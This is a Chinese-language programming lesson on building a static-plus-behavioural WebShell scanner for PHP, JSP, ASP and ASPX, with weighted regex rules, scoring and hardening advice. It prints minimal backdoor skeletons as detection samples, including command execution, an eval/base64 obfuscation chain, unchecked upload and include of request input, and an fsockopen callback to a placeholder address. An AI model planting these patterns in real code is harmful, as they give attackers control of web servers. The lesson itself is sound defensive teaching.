# Day 158 — WebShell 检测：实战扫描器（静态特征 + 行为关联 + 评分定级）

> Phase 10 — 网络安全开发。**实战项目**：面向真实检测场景的 WebShell 扫描器。
>
> **授权边界（重要）**：本课所有样本与扫描只用于**授权环境**（你自己的服务器、靶场、
> 或已获书面授权的评测环境）与**离线只读副本**。扫描器不导入、不解码、不执行被扫描
> 文件，不发任何网络请求，不自动删除或隔离任何文件。
> 样本中的命令、地址、路径、载荷**全部是占位符**（如 `whoami`、`203.0.113.1`、
> `PLACEHOLDER`），不构成可部署的后门，也不包含任何规避检测的对抗手法。

## 1. 学习目标

完成本课后，应能：

- 说清 WebShell 的**四类形态**（命令执行 / 动态求值 / 编码混淆 / 文件上传）各自
  **靠什么机制工作**，以及它们为什么会留下可被词法匹配的特征
- 识别各语言（PHP / JSP / ASPX / ASP）常见后门特征对应的**危险 API 与语言构造**
- 理解**命中 ≠ 恶意**：同一个 API 在正常业务代码里也出现，特征只是复核线索
- 用**加权评分**给文件定级（clean / low / medium / high / critical），并知道分值怎么来的
- 用**行为信号关联**（上传脚本 + 子进程 + 命令参数）判断一台主机是否需人工复核
- 理解扫描器的**局限**：误报从哪来、漏报为什么不可避免，以及"无命中 ≠ 安全"

## 2. 概念：WebShell 是什么

### 2.1 定义

**WebShell** 是一段被放进 Web 可访问位置、能让攻击者通过 HTTP 请求间接控制服务器的
代码。它的本质是**一个把 HTTP 请求参数变成服务端操作的翻译层**：

```text
攻击者的 HTTP 请求 ──▶ Web 服务器执行脚本 ──▶ 脚本把参数当作命令/代码/文件路径执行
        （输入）              （执行点）                    （危险汇点 sink）
```

关键点：**它不需要自己监听端口**。它寄生在已经对外开放的 Web 服务上，
流量混在正常 HTTP 里，因此常常绕过网络层的边界防护。

### 2.2 为什么它是攻击链的"最后一跳"

一条典型的 Web 入侵链是：

```text
① 找入口（上传点 / 反序列化 / SQLi / 文件包含 / 依赖漏洞）
② 写入代码（上传文件、写日志、写配置、写 session）
③ 触发代码（访问那个 URL）
④ 提权 / 横向（读配置里的凭据、连内网、装内网工具）
⑤ 持久化（再放一个更隐蔽的 WebShell 或内存马）
```

第 ② 步落下来的文件就是 WebShell。检测它的价值在于：**它是攻击者必须留下来的
一个物理痕迹**——只要落地成文件，就一定能被文件系统层面的检查看到。

### 2.3 四类形态总览

这四类不是"四种不同病毒"，而是**同一条链上的四种技术选择**，而且经常叠加使用：

| 形态 | 一句话机制 | 真实文件里的样子（占位） | 命中的规则族 | 典型权重 |
|---|---|---|---|---|
| **命令执行** | 把外部输入当 OS 命令交给 shell | `system('whoami')` / `Runtime.exec` / `WScript.Shell.Run` | `php_cmd_exec`、`php_backtick_exec`、`jsp_runtime_exec`、`jsp_process_builder`、`aspx_process_start`、`asp_wscript_shell` | 3 / 2 |
| **动态求值** | 把外部输入当**代码**执行（比命令更危险：不分语言边界） | `eval($x)` / `assert($x)` / `Execute($x)` / `defineClass` | `php_dynamic_eval`、`php_call_user_func`、`asp_execute`、`jsp_define_class` | 3 / 2 |
| **编码混淆** | 把危险字符串藏成密文，运行时才解码 | `@eval(gzinflate(str_rot13(base64_decode('...'))))` | `encode_decode`、`encode_encode`、`php_error_suppress`、`php_long_obfuscated_var`、`php_globals_var` | 1–2 |
| **文件上传** | 把代码**写进**服务器，再由 Web 访问触发 | `move_uploaded_file($_FILES['f']['tmp_name'], $dst)` | `file_write`、`file_mod`、`php_superglobal_input` | 2 / 1 |

另外两个横切能力（不属于"形态"但与形态一起出现）：

| 能力 | 机制 | 命中的规则 | 权重 |
|---|---|---|---|
| **网络外联** | 后门主动回连攻击者（反向 shell / C2） | `network_socket`（`fsockopen`/`stream_socket_client`/`socket_create`/`curl_exec`） | 2 |
| **动态包含** | 把外部输入当文件路径包含进来（LFI/RFI） | `include_dynamic`（`include`/`require` 后直接跟 `$` 或引号） | 1 |

> 记忆法：**"外部输入"（`$_GET`/`$_POST`/`$_REQUEST`/`$_COOKIE`/`$_FILES`）出现的地方，
> 就是危险汇点可能出现的地方**。但"出现了输入"本身完全无害（几乎每个网页都有），
> 只有"输入**直接**流向危险汇点"才有问题——这是数据流分析要回答的问题（见 4.1）。

### 2.4 家族谱系与边界

| 类型 | 是否落地为文件 | 本课是否覆盖 |
|---|---|---|
| 一句话后门（几行代码，只做命令执行） | 是 | ✅ 覆盖（`simple-cmd.php`） |
| 大马（带 UI，文件管理 / 数据库 / 命令面板） | 是 | ✅ 特征同类（文件操作 + 命令执行） |
| 混淆后门（编码 + 动态求值叠加） | 是 | ✅ 覆盖（`obfuscated.php`） |
| 内存马（注册 Filter / Servlet / Agent，不落盘） | 否 | ❌ **不在本课范围**（需要运行时/内存检测） |
| 无文件（把代码写进数据库、日志、session） | 部分 | ❌ 不在本课范围（需要日志与数据面检测） |

内存马与无文件后门是真实对抗的前沿，本课的静态扫描器**结构上**看不到它们。
这一点必须写进结论，不能因为"扫了没发现"就说"没有后门"。

## 3. 底层机制：这些特征为什么一定会出现在文件里

理解机制的目的很实际：**知道哪些 API 是"功能本身决定必须出现"的，才能写出
不会因为改名/换写法就失效的规则。**

### 3.1 PHP：命令执行

```php
system('whoami');        // 执行命令并把输出直接打印
exec('id', $out);        // 执行命令，输出按行存进数组
shell_exec('id');        // 执行命令，返回完整输出字符串
passthru('id');          // 执行命令，二进制输出直接透传（适合反向 shell）
popen('id', 'r');        // 打开进程管道（可读/可写，双向交互）
proc_open('id', ...);    // 完全受控的子进程（可控制 stdin/stdout/stderr）
pcntl_exec('/bin/sh');   // 直接替换当前进程映像（最隐蔽）
`id`;                    // 反引号 = shell_exec() 的语法糖（最容易被忽略）
```

**为什么这些特征稳定？** 因为它们都是 PHP 提供的**语言级/标准库级封装**，
最终都要落到 C 库的 `fork`/`exec` 或 shell 上。后门作者可以改函数名之外的一切
（变量名、缩进、注释），但**只要还想执行系统命令，就必须调用其中之一**——
这正是词法规则能生效的物理基础。

### 3.2 PHP：动态求值（比命令执行更危险）

```php
eval($code);                        // 把字符串当 PHP 代码执行
assert($code);                      // 老版本 PHP 中字符串会被求值（历史后门常用）
create_function('$a', $code);       // 运行时创建函数（已废弃，但老代码里常见）
call_user_func($fn, $arg);          // 回调：函数名可控 → 等于可控调用
call_user_func_array($fn, $args);
array_map($fn, $arr);               // 回调族：$fn 来自输入即为后门
$fn = $_GET['fn']; $fn('id');       // 变量函数：$f() 语法，最难用正则抓稳
```

**为什么它比命令执行更危险？** 命令执行只能调用 OS 命令；动态求值执行的是
**宿主语言的代码**，可以直接读写文件、连数据库、发 HTTP 请求——危害面是无限大的。

**为什么它难检测？** 变量函数（`$f()`）与回调族在正常框架代码里也大量出现
（路由分发、事件系统），所以本课给它的是**中低权重 + 必须人工复核**，而不是"命中即恶意"。

### 3.3 PHP：为什么后门作者要做编码混淆

因为最朴素的静态检测就是"搜关键字"。所以后门作者做的事是：
**让"危险字符串"在文件里不以明文出现，而在运行时才被组装出来。**

```php
// 经典三层解码链（本课样本 obfuscated.php 的骨架，载荷为占位符）
@eval(gzinflate(str_rot13(base64_decode('eJwLSS0uAQAFAAGi'))));
```

逐层拆开：

| 层 | 函数 | 作用 |
|---|---|---|
| 1 | `base64_decode` | 把 base64 文本还原成字节 |
| 2 | `str_rot13` | 字母位移，让第 1 层的结果即使被看到也不像 base64 |
| 3 | `gzinflate` | zlib 解压，把体积压到最小（文件看起来只是乱码小串） |
| 4 | `eval` | 真正执行解码出来的代码 |
| 装饰 | `@` | 抑制错误输出，避免"解码失败"暴露给管理员 |
| 装饰 | `$GLOBALS[...]` / 超长变量名 | 打散字符串、干扰人工阅读与正则匹配 |

对应的检测规则族：

| 规则 | 匹配 | 权重 | 为什么这么定 |
|---|---|---|---|
| `encode_decode` | `base64_decode` / `gzinflate` / `gzuncompress` / `str_rot13` / `hex2bin` / `pack` | 2 | 解码单独出现可能是正常业务（读配置），但在**含 eval 的文件里**就是强信号 |
| `encode_encode` | `base64_encode` / `gzcompress` / `str_rot13` / `bin2hex` | 1 | 编码在正常业务里极常见（生成 token、十六进制表示），只能给最低权重 |
| `php_error_suppress` | `@system` / `@eval` / `@include` … | 1 | 抑制错误是"不想被发现"的弱信号 |
| `php_long_obfuscated_var` | `$` + 16 个字符以上的变量名赋值 | 1 | 正常代码也有长变量名，属弱特征 |
| `php_globals_var` | `$GLOBALS[` | 1 | 常用于打散变量作用域，属弱特征 |

> **权重设计的核心思想**：权重不是"这个词有多坏"，而是"**这个词单独出现时有多可疑**"。
> `base64_decode` 单独出现＝可能是正常业务（2 分）；`eval` 单独出现＝高度可疑（3 分）；
> `@eval(...)` 组合出现＝两头分数叠加，自然进入 high/critical。

### 3.4 JSP：命令执行与"免杀"字节码

```java
Runtime.getRuntime().exec(new String[]{"sh", "-c", "id"});   // 最经典
new ProcessBuilder("sh", "-c", "id").start();                // 更现代、更灵活
```

```java
// defineClass 形态：自己加载一段字节码，不走磁盘上的 .class 文件
Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", ...);
```

**`defineClass` 为什么权重给 2（动态类）？** 因为它让攻击者可以把恶意逻辑写成
**内存里的字节码**，磁盘上只留一行"看起来无害"的类加载代码——这已经接近内存马，
属于静态检测能力的边缘。本课只做"出现即标记"，不保证抓得住。

### 3.5 ASP / ASPX：COM 对象与 .NET 进程

```asp
<% ' 经典 ASP：调用 Windows COM 组件
Set sh = CreateObject("WScript.Shell")
sh.Run "cmd /c whoami"
Set fso = CreateObject("Scripting.FileSystemObject")
%>
```

```csharp
<%-- ASPX：.NET 世界里等价的写法 --%>
System.Diagnostics.Process.Start("whoami");
```

ASP 还有一个独有的动态求值入口：`Execute("...")` / `ExecuteGlobal("...")`
（把字符串当 VBScript 代码执行，等价于 PHP 的 `eval`）。

### 3.6 文件上传形态：为什么它是最常见的入口

机制链条非常清晰：

```text
① 网站有上传功能（头像、附件、导入）
② 服务端校验缺失或可绕过（只查 Content-Type / 只查后缀黑名单 / 不改名）
③ 上传的文件落到 Web 可访问目录
④ 文件名后缀可执行（.php / .jsp / .aspx）或配合解析漏洞（.php.jpg、%00 截断）
⑤ 攻击者直接访问该 URL → Web 服务器执行它
```

所以**上传点 + 落盘 API** 是检测的重点：

| 规则 | 匹配 | 权重 | 说明 |
|---|---|---|---|
| `file_write` | `fwrite` / `fputs` / `file_put_contents` / `move_uploaded_file` | 2 | 写文件是"落地"的必要动作 |
| `file_mod` | `chmod` / `unlink` / `rename` / `copy` | 1 | 改权限/改名/删除，常见于清理痕迹或提高权限 |
| `php_superglobal_input` | `$_GET[...]` / `$_POST[...]` / `$_FILES[...]` … | 1 | 外部输入入口（单独出现完全无害） |

**关键教学点**：正常业务的上传处理器**同样会用** `move_uploaded_file` 和 `$_FILES`。
本课样本集里专门放了一个 `benign-upload.php`——它做了类型白名单 + 随机重命名，
逻辑完全正当，**却依然被评到 high（5 分）**。这就是静态特征的物理上限：
它能告诉你"这里有写文件动作"，但**不能**告诉你"写入的路径/后缀是否可控"。

## 4. 检测原理：词法扫描到底做了什么

### 4.1 三个层次，本课在第几层

```text
第 1 层  词法/正则     "文件里出现了 system( 吗？"           ← 本课在这里
第 2 层  语法/语义     "这个 system( 参数的表达式类型是什么？"
第 3 层  数据流         "外部输入能不能一路流到这个参数？"
```

第 1 层快、便宜、能扫任何文本；代价是**分不清"提到"和"使用"**：

```php
echo "文档：不要用 system()";      // 只是字符串 → 会被误报
system('whoami');                  // 真的在用 → 命中所指
```

第 3 层才能回答"能不能被真正利用"，但那需要 AST、跨文件追踪、常量传播——
不是本课范围。**因此本课所有结论的措辞都必须停在"需人工复核的线索"。**

### 4.2 规则模型

```python
Rule = tuple  # (name, pattern, weight, category, languages)
# ex: ('php_cmd_exec', re.compile(r'\b(?:system|exec|shell_exec|...)\s*\(', re.I),
#      3, 'command', {'php'})
```

| 字段 | 作用 | 设计理由 |
|---|---|---|
| `name` | 规则唯一标识 | 报告里按它聚合，是 baseline 抑制的键 |
| `pattern` | 已编译正则 | 编译一次复用（`re.compile`），避免每次 `finditer` 重复编译 |
| `weight` | 1–3 | 表达"单独出现时有多可疑"，不是"有多坏" |
| `category` | 8 类之一 | 供报告分类统计与人工快速定位 |
| `languages` | 语言标签集合 | **压制跨语言误报**：Java 的 `.exec()` 不该命中 PHP 规则 |

### 4.3 语言标签与扩展名映射（含一个真实的坑）

```python
EXT_LANGS = {'.php': {'php'}, '.phtml': {'php'}, '.jsp': {'jsp'},
             '.aspx': {'aspx'}, '.asp': {'asp'}, ...}
```

匹配时：

```python
if languages and not (langs & languages):   # 文件已知语言 & 规则不支持它 → 跳过
    continue
```

- 已知扩展名（如 `.php`）→ 只跑该语言的规则，**大幅降低跨语言误报**
- **未知扩展名（`.txt` / `.log` / `.md`）→ `languages=None` → 全部规则参与**

第二条是本课的**故意设计**：文档里提到危险 API 也必须能被扫出来（然后交给人判断），
否则"攻击者把后门改名成 `.txt` 再通过包含漏洞使用"就会完全漏掉。

> **实测的坑**：样本 `aspx.aspx.cs` 的后缀是 `.cs`，**不在** `EXT_LANGS` 里，
> 所以它走的是"未知扩展名 → 全部规则参与"。它能命中 `aspx_process_start`
> 是因为 ASPX 规则确实包含 `Process.Start`，而不是因为扩展名被识别成 ASPX。
> 真实项目里 `.cs` 是源码文件，这种"未知扩展名全规则参与"的设计会带来噪声，
> 生产化时应补一条 `.cs` 的映射或加白名单（练习 3）。

### 4.4 评分模型

```python
def score_findings(findings):
    counts = {}                                  # 按规则名统计命中次数
    for f in findings:
        counts[f['rule']] = counts.get(f['rule'], 0) + 1
    score = 0
    for rule, count in counts.items():
        weight = <该规则的权重>
        score += weight + max(0, min(count, 3) - 1) * 1   # 首次记权重，之后每次 +1，封顶 3 次
    return score
```

用文字表述：

| 情况 | 计分 |
|---|---|
| 某规则命中 1 次 | `weight` |
| 命中 2 次 | `weight + 1` |
| 命中 3 次 | `weight + 2` |
| 命中 ≥4 次 | `weight + 2`（**封顶**，不再累加） |

**为什么重复命中要加分？** 混淆/循环调用的后门往往在同一文件里重复出现同一个 API；
而正常业务代码一般调用一两次。所以"重复"本身是弱信号。

**为什么要封顶？** 否则一个循环变量名写法的正常文件（比如大量 `file_put_contents`）
会仅凭数量冲到 critical，误报代价太高。封顶让"数量"最多贡献 2 分。

**实测复现**（可用 `01-static-scanner.py --lab` 核对）：

| 文件 | 命中的规则（次数） | 计分过程 | 得分 | 等级 |
|---|---|---|---|---|
| `clean.php` | `php_superglobal_input`×1 | 1 | 1 | low |
| `docs.txt` | `php_cmd_exec`×2 | 3 + 1 | 4 | medium |
| `simple-cmd.php` | `php_cmd_exec`×1 | 3 | 3 | medium |
| `obfuscated.php` | `php_dynamic_eval`×1 + `encode_decode`×1 + `encode_encode`×1 + `php_error_suppress`×1 | 3+2+1+1 | 9 | **critical** |
| `benign-upload.php` | `file_write`×1 + `php_superglobal_input`×2 + `encode_encode`×1 | 2 + (1+1) + 1 | 5 | **high** |
| `asp.asp` | `asp_wscript_shell`×1 | 3 | 3 | medium |
| `jsp.jsp` | `jsp_runtime_exec`×1 | 3 | 3 | medium |
| `aspx.aspx.cs` | `aspx_process_start`×1 | 3 | 3 | medium |
| `upload-shell.php` | `file_write`×1 + `php_superglobal_input`×2 | 2 + 2 | 4 | medium |
| `network-backdoor.php` | `network_socket`×1 + `file_write`×1 | 2 + 2 | 4 | medium |
| `dynamic-include.php` | `include_dynamic`×1 + `php_superglobal_input`×1 | 1 + 1 | 2 | low |
| `callback-backdoor.php` | `php_call_user_func`×1 + `php_superglobal_input`×1 | 2 + 1 | 3 | medium |

注意最后三行：**只有动态包含形态掉到了低分**，因为 `include_dynamic` 权重只有 1。
这不是 bug——它的意思是"这个特征单独出现时不够可疑"，需要行为和基线来补充。

### 4.5 分级阈值

| 得分 | 等级 | 处理建议（教学基线） |
|---|---|---|
| ≥8 | critical | 立即人工复核，按事件响应流程走 |
| ≥5 | high | 优先复核（含正常业务误报，如 `benign-upload.php`） |
| ≥3 | medium | 结合行为信号与业务基线判断 |
| ≥1 | low | 记录观察，不单独触发处置 |
| 0 | clean | **不代表安全**，只代表内置规则没匹配到 |

阈值和权重都是**教学基线**，真实产品要按业务调整：一个电商网站的
"上传处理器"很多，`file_write` 的权重就该降；一个纯 API 服务出现 `system(`
就非常异常，权重可以升。

### 4.6 命中 ≠ 恶意：三类误报来源

| 来源 | 例子（本课样本） | 为什么会产生 | 降噪思路 |
|---|---|---|---|
| **文档 / 注释提到 API 名** | `docs.txt`：运维手册写"别用 `system()` / `exec()`" | 正则只看字符串，不看语境 | 跳过注释块；对 `.md/.txt` 给更低权重 |
| **正常业务的同名 API** | `benign-upload.php`：正当上传处理器 | 危险 API 与正常功能共用同一批函数 | 数据流分析（路径是否可控）；结合目录基线 |
| **编码/序列化的正常用途** | `base64_encode` 生成 token、`bin2hex` 生成随机 ID | 编码函数本身无善恶 | 只给 1 分；必须与高危规则共现才升级 |

**结论**：静态扫描器的正确用法是**排序**（把最可疑的文件排到最前面），
而不是**判定**（说某个文件是后门）。任何"命中即删除"的自动化都是错的——
误报会直接变成生产事故（见练习 8）。

## 5. 攻击特征 ↔ 检测特征：完整对照

### 5.1 全部 20 条规则（`--rules` 输出）

```text
asp_wscript_shell        w=3  command      ASP
aspx_process_start       w=3  command      ASPX
jsp_process_builder      w=3  command      JSP
jsp_runtime_exec         w=3  command      JSP
php_cmd_exec             w=3  command      PHP
php_dynamic_eval         w=3  dynamic      PHP
asp_execute              w=2  dynamic      ASP
encode_decode            w=2  encoding     ASPX, PHP, ASP
file_write               w=2  filesystem   PHP
jsp_define_class         w=2  dynamic      JSP
network_socket           w=2  network      PHP
php_backtick_exec        w=2  command      PHP
php_call_user_func       w=2  dynamic      PHP
encode_encode            w=1  encoding     ASPX, PHP, ASP
file_mod                 w=1  filesystem   PHP
include_dynamic          w=1  include      PHP
php_error_suppress       w=1  obfuscation  PHP
php_globals_var          w=1  obfuscation  PHP
php_long_obfuscated_var  w=1  obfuscation  PHP
php_superglobal_input    w=1  input        PHP
```

按类别归纳（8 类）：

| 类别 | 规则数 | 含义 | 权重范围 |
|---|---|---|---|
| `command` | 7 | 能执行 OS 命令 | 2–3 |
| `dynamic` | 4 | 能执行代码/加载类 | 2–3 |
| `encoding` | 2 | 编解码（混淆链的一环） | 1–2 |
| `obfuscation` | 3 | 干扰阅读/检测的装饰手法 | 1 |
| `filesystem` | 2 | 文件写/改/删 | 1–2 |
| `network` | 1 | 主动外联 | 2 |
| `input` | 1 | 外部输入入口 | 1 |
| `include` | 1 | 动态包含 | 1 |

### 5.2 样本逐字（占位载荷）

`01-static-scanner.py` 的 `SAMPLES` 是一个**自包含、可复现**的样本集。
样本只保留"特征骨架"，载荷全是占位符——**不可直接部署**：

```php
// simple-cmd.php —— 命令执行形态
<?php
// 占位载荷演示：真实场景中此处命令由外部输入拼接
system('whoami');   // 占位命令，仅用于教学特征演示
```

```php
// obfuscated.php —— 多层编码 + 动态求值形态
<?php
@eval(gzinflate(str_rot13(base64_decode('eJwLSS0uAQAFAAGi'))));
```

```php
// upload-shell.php —— 文件上传/落盘形态
<?php
$dst = $_POST['dst'] ?? '/tmp/placeholder-noop';
move_uploaded_file($_FILES['f']['tmp_name'], $dst);
```

```php
// network-backdoor.php —— 外联形态（占位地址，不会真的连出去）
<?php
$s = fsockopen('203.0.113.1', 4444);
fwrite($s, 'placeholder');
```

```php
// dynamic-include.php —— 动态包含形态
<?php
include($_GET['page']);
```

```php
// callback-backdoor.php —— 回调/可变函数形态
<?php
$fn = $_GET['fn'];
call_user_func($fn, 'placeholder');
```

```php
// benign-upload.php —— 对照组：**正常业务**的上传处理器
// 类型白名单 + 随机重命名，逻辑完全正当，却依然评到 high（5 分）
<?php
$allow = ['image/png', 'image/jpeg'];
if (!in_array($_FILES['avatar']['type'], $allow, true)) {
    http_response_code(400); exit;
}
move_uploaded_file($_FILES['avatar']['tmp_name'],
    '/srv/static/avatars/' . bin2hex(random_bytes(8)) . '.bin');
```

以及三语言骨架（`asp.asp` / `jsp.jsp` / `aspx.aspx.cs`）与两个对照文件
（`clean.php` 正常页面、`docs.txt` 文档误报）。

### 5.3 从"特征"到"人工复核问题"的映射

| 命中的规则 | 复核时必须回答的问题 |
|---|---|
| `*_cmd_exec` / `Process.Start` / `WScript.Shell` | 命令字符串是常量还是拼接了外部输入？这个文件在业务里应该存在吗？ |
| `php_dynamic_eval` / `asp_execute` / `jsp_define_class` | 求值的字符串从哪来？是模板引擎/路由框架的正常用法吗？ |
| `encode_decode` + `php_error_suppress` 共现 | 解码结果的用途是什么？为什么需要抑制错误？ |
| `file_write` + `php_superglobal_input` 共现 | 写入路径、文件名、后缀是否可控？目标目录是否 Web 可访问？ |
| `network_socket` | 目标地址是业务依赖还是陌生的外部地址？ |
| `include_dynamic` | 被包含的文件名是否可控？是否存在 LFI/RFI 条件？ |

## 6. 行为关联：从"文件里有特征"到"这台机器在干什么"

静态扫描回答"这个文件像不像"，行为关联回答"**这台机器上正在发生什么**"。

`02-behavior-hunter.py` 接收合成审计事件（模拟 Web 日志 + 进程事件），
按 `(host, instance)` 分组累加信号分：

| 信号 `kind` | 分值 | 必要字段 | 含义 |
|---|---|---|---|
| `upload_script_write` | 3 | host, instance, request | 上传目录里被写入了脚本 |
| `child_start` | 2 | host, instance | Web 进程启动了子进程 |
| `cmd_arg_shell` | 2 | host, instance | 子进程命令行里带 shell |
| `upload_then_delete` | 2 | host, instance, request | 上传后立刻删除（清理痕迹） |
| `suspicious_ua` | 1 | host | 明显异常的 User-Agent |
| `many_failed_auth` | 1 | host | 大量认证失败 |

总分 ≥ `REVIEW_THRESHOLD = 4` → `review_required = True`。

### 6.1 三个必须理解的设计决定

**① 分组键必须含 `host`。** 不同主机的同名 Web 进程是完全独立的对象。
按 `(host, instance)` 分组，跨主机的信号不会互相"凑分"。

**② `instance` 必须是"进程启动标识"，不能用 PID。**

```text
PID 是会复用的：一个 Web worker 崩掉后，新 worker 可能拿到同一个 PID。
如果拿 PID 当分组键，"旧 worker 的上传事件"会和"新 worker 的子进程事件"
被错误地拼成同一个攻击链 —— 凭空造出一条不存在的证据。
本课用 "启动时间 + 身份" 作为 instance（样本里写作 worker-start-1 / start-2）。
```

**③ 信息不全时不下结论。** `--no-window` 模拟"时间窗口信息缺失"：

```bash
python3 code/02-behavior-hunter.py --no-window --events '[{"host":"web01","kind":"child_start"}]'
# → 直接返回 reason="time_window_unknown"，review_required=True（但要人工看）
```

理由很硬：**没有时间窗，就无法判断"上传"和"子进程"是不是同一件事造成的**。
把两个相隔 3 小时的正常事件拼成攻击链，比漏报更有害——因为它看起来像证据。

### 6.2 静态 + 行为的正确配合方式

```text
静态扫描（离线副本，文件级）          行为关联（时间窗，主机级）
  ├─ 找出可疑文件                       ├─ 找出可疑主机
  ├─ 产物：文件 → 分数/等级             ├─ 产物：主机 → 信号/分数
  └─ 局限：不知道文件是否被访问过       └─ 局限：不知道被写入的文件内容是什么
                    ⬎                        ⬐
              交叉验证：同一个时间窗内，
              "上传目录被写入脚本" + "该脚本被访问" + "出现了子进程"
              = 一条完整的、值得立即人工介入的证据链
```

## 7. 防护与修复原理

检测是"事后"，防护是"事前缩小爆炸半径"。按投入产出排序：

### 7.1 让后门**写不下来**（最优先）

| 措施 | 原理 | 关键点 |
|---|---|---|
| 上传目录**禁止执行** | 即使上传了 `.php`，Web 服务器也不解析 | Nginx `location ^~ /uploads/ { ... }` 关掉 PHP handler；或挂载 `noexec` |
| 上传文件**重命名** | 丢掉原始后缀，用随机 ID + 固定后缀 | 本课 `benign-upload.php` 就是这个做法 |
| **白名单**校验 | 只允许已知安全类型 | 白名单 > 黑名单：黑名单永远漏 `.php5` `.phtml` `.pHp` |
| 校验**内容**而非 `Content-Type` | `Content-Type` 由客户端提供，可任意伪造 | 检查文件头魔数 + 重新编码图片 |
| **存储与 Web 根分离** | 文件放对象存储/独立域名，不落在脚本可执行的目录 | 这一步能一次性消掉大部分上传型 WebShell |

### 7.2 让后门**就算写下来也做不了事**

| 措施 | 原理 |
|---|---|
| `disable_functions`（PHP） | 禁用 `system`/`exec`/`shell_exec`/`passthru`/`popen`/`proc_open`/`pcntl_exec` |
| `open_basedir`（PHP） | 限制脚本能访问的目录，挡住读 `/etc/passwd` 与横向 |
| 最小权限运行 | Web 进程用专用低权限账号，不用 `www-data` 去读写全站 |
| 只读挂载代码目录 | 攻击者无法在代码目录里落地文件 |
| 出网限制 | 挡住反向 shell / C2 回连（对应 `network_socket` 特征） |
| WAF / RASP | 拦截明显的 `eval($_POST[` 之类请求；RASP 能在运行时拦危险调用 |

### 7.3 让后门**藏不住**（对应对手：混淆）

- 文件完整性监控（FIM）：对 Web 目录做哈希基线，任何变化都告警
- 只允许通过发布流程改动 Web 目录（不可变基础设施）
- 审计 `php.ini`、Web 服务器访问日志；对"从未出现过的 URL 返回 200"告警

### 7.4 修复流程（发现疑似后门后）

```text
1. 证据保全：对目录做哈希快照，复制离线副本，记录时间与来源（本课扫描器只读）
2. 静态扫描：跑 03-webshell-scanner.py，看 high/critical
3. 人工复核：确认特征是否在注释/文档/正常依赖里；危险调用是否真的接收外部输入
   ⚠️ 绝不要"运行一下试试" —— 那可能触发回连或破坏证据
4. 行为关联：把同一时间窗的上传/进程/访问事件喂给 02-behavior-hunter.py
5. 处置（由负责人决定）：限制服务、轮换所有可能泄露的凭据、排查入口点
6. 复测：修复后重跑扫描确认基线；检查日志覆盖是否完整
```

> **为什么工具不自动处置？** 因为"发现问题的组件不应该有权处置问题"。
> 模式匹配必然产生误报（4.6），一旦自动化处置，一次误报就是一次生产事故。
> 发现与处置必须是两套权限、两道人工关卡。

## 8. 代码案例逐节说明

### 8.1 `code/static_scan.py` — 规则引擎（被三个脚本共用）

| 部分 | 内容 |
|---|---|
| `RULES` | 20 条规则，`(name, pattern, weight, category, languages)` |
| `LANG_NAMES` / `EXT_LANGS` | 语言标签 → 展示名；扩展名 → 语言集合（压制跨语言误报） |
| `SEVERITY_LEVELS` / `classify_score` | 四级阈值；`score → level` |
| `inspect_text(text, languages)` | 逐规则 `finditer`，返回命中（规则名/类别/权重/**行号**）并排序 |
| `score_findings(findings)` | 4.4 的评分模型 |
| `summarize(findings)` | 按规则聚合，给人工复核压缩后的摘要 |
| `inspect_file(path)` | **安全守卫**：见下 |
| `scan_tree(root, max_files)` | 遍历目录，不跟随符号链接，返回 `files` / `truncated` / `walk_errors` |
| `print_rules()` | `--rules` 输出 |
| `self_test()` / `__main__` | `--self-test`：验证规则库结构、分级阈值、评分封顶、语言过滤 |

`inspect_file` 里的**只读安全守卫**（每一条都有具体理由）：

| 守卫 | 代码 | 防的是什么 |
|---|---|---|
| 不跟随符号链接 | `os.O_NOFOLLOW` + `path.is_symlink()` 预检 | 顺着 `link → /etc/shadow` 走出扫描范围 |
| 只读打开 | `os.O_RDONLY` | 绝不写、不改权限 |
| 必须普通文件 | `stat.S_ISREG(os.fstat(...).st_mode)` | 设备文件/FIFO 会让 `read` 卡死 |
| 非阻塞 | `os.O_NONBLOCK` | 同上，防止在特殊文件上挂住 |
| 大小上限 1 MiB | `read(LIMIT + 1)` 再判长度 | 不把巨型日志/镜像读进内存 |
| 二进制跳过 | `b'\0' in data` | 不解析二进制 |
| 编码检查 | `decode('utf-8')` 失败即跳过 | 避免乱码产生无意义的匹配 |
| 异常归类 | `except OSError → status='error'` | 单文件失败不中断整次扫描，但必须记录 |

### 8.2 `code/01-static-scanner.py` — 样本集 + 评分演示

- `SAMPLES`：**12 个**文件，覆盖正常业务 / 文档误报 / 命令执行 / 编码混淆 /
  文件上传 / 外联 / 动态包含 / 回调 / 三语言骨架 / 正常上传对照组
- `build_lab(root)`：把样本写进调用方给的目录（本脚本只写临时的）
- `self_test()`：断言"该认的认出来、该低分的低分、误报确实会被命中"
- `--lab`：在 `tempfile.TemporaryDirectory()` 里生成样本并输出完整 JSON 报告
  （退出即清理，不污染工作树）

### 8.3 `code/02-behavior-hunter.py` — 行为关联

- `SIGNALS`：信号 → `(分值, 必要字段集合)`
- `analyze(events, window_ok=True)`：按 `(host, instance)` 分组累加；
  缺必要字段**直接抛 `ValueError`**（而不是静默给 0 分）
- `--events '<json>'`：喂合成事件；`--no-window`：模拟时间窗缺失
- 自测覆盖：跨主机不叠加、跨实例（PID 复用）不叠加、分数不足不触发、
  缺字段报错、时间窗缺失拒绝下结论

### 8.4 `code/03-webshell-scanner.py` — 完整 CLI

| 参数 | 作用 |
|---|---|
| `target` | 要扫描的本地目录（必填，除非 `--self-test` / `--rules`） |
| `--max-files N` | 文件遍历上限（默认 1000） |
| `--rules` | 打印规则库 |
| `--self-test` | 自测 |

JSON 输出结构：

| 字段 | 含义 |
|---|---|
| `files` | 每个文件：`status`（scanned/skipped/error）、`findings`、`score`、`severity`、`summary` |
| `summary.files_total` / `files_scanned` | 覆盖规模 |
| `summary.high_or_critical` | 高危文件数 |
| `summary.top_findings` | 按等级排序的前 20 个高危/严重文件 |
| `truncated` / `walk_errors` | **覆盖不全必须如实报告** |
| `notice` | 使用边界提醒 |

**退出码**：

| 码 | 含义 |
|---|---|
| 0 | 所有列出的文件成功扫描（**即使命中了高危**） |
| 2 | 参数错误，或覆盖不全（有跳过/错误/被截断） |

> 注意 `0` **不代表安全认证**，只代表"这次扫描按计划跑完了"。
> 反过来，`2` 也不代表"发现了攻击"，它更可能是"有文件太大读不了"。

## 9. 运行命令 + 预期输出（实测）

### 9.1 自测（四个文件）

```bash
cd ~/code/Learn-Python
python3 days/day-158-webshell-检测/code/static_scan.py        --self-test
python3 days/day-158-webshell-检测/code/01-static-scanner.py  --self-test
python3 days/day-158-webshell-检测/code/02-behavior-hunter.py --self-test
python3 days/day-158-webshell-检测/code/03-webshell-scanner.py --self-test
```

